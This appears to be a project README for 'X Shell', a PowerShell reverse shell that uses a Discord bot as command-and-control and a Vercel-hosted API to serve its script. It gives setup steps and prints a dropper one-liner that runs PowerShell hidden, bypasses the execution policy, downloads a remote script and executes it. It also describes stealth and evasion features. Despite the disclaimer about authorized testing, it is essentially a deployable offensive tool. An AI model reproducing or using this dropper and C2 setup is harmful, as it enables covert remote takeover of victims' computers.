![banner](src/banner.png)
# X Shell: Discord-Based Reverse Shell

## 🚨 Disclaimer

**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.

## Quick Start Guide

### Prerequisites
- Discord server
- Discord bot with channel management permissions
- Vercel account for API deployment

### 1. Create Discord Bot
1. Visit [Discord Developer Portal](https://discord.com/developers/applications)
2. Create new application
3. Generate bot token
4. Configure bot permissions:
   - Manage Channels
   - Read Messages
   - Send Messages

### 2. Deploy Backend API
1. Fork the repository
2. Deploy to Vercel
3. Configure `index.js`:
   - Set authentication tokens on lines 28-29
   - Update PowerShell script serving on lines 31 and 36
4. Note the generated Vercel URL

### 3. Prepare Deployment
1. Update the script with:
   - Bot token (`$t`)
   - Server ID (`$s`)
   - Category ID (`$categoryID`)

### 4. Execute Dropper
```powershell
powershell -W Hidden -Exec Bypass -c "$r = iwr https://xyz.vercel.app/ -H @{'Authorization'='Bearer xyzxyz'}; iex $r.Content"
```

## Overview

X Shell is a PowerShell-based reverse shell that leverages a Discord server as its command-and-control (C2) infrastructure. It dynamically creates dedicated Discord channels for each user, enabling organized command execution and response tracking.

## Features

- 🔒 Stealthy PowerShell dropper mechanism
- 🤖 Discord-based command and control
- 🔐 Dynamic channel creation for each session
- 🌐 Remote script retrieval via API

## Architecture

### Components

1. **PowerShell Dropper**
   - Bypasses Windows execution restrictions
   - Retrieves main script from remote API
   - Minimal footprint for evasion

2. **Backend API**
   - Authenticates and serves scripts
   - Manages script deployment
   - Provides secure script retrieval

3. **Discord C2 Server**
   - Manages communication channels
   - Executes received PowerShell commands
   - Returns command output

## Security Considerations

- Implement strict authentication
- Rotate tokens regularly
- Monitor and log all activities
- Ensure compliance with legal standards

## Contributing

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push and submit pull request

## Additional Resources

- [Discord Server Template](https://discord.new/AFkzNqmAdmex)
- Preconfigured server with logging channels

## License

[Specify your license here]

## Contact

[Your contact information or support channels]
